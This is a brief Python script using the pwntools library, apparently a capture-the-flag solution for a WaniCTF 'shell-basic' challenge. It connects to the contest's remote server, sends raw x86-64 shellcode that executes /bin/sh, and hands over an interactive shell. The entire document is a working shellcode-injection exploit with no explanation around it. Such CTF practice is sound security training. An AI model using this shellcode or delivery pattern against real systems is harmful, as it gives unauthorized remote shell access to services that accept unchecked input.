from pwn import *

#pc = process("./chall")
pc = remote("shell-basic-pwn.wanictf.org", 9004)
shell_code = b"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"  # PUT YOUR SHELL CODE HERE
pc.sendline(shell_code)
pc.interactive()
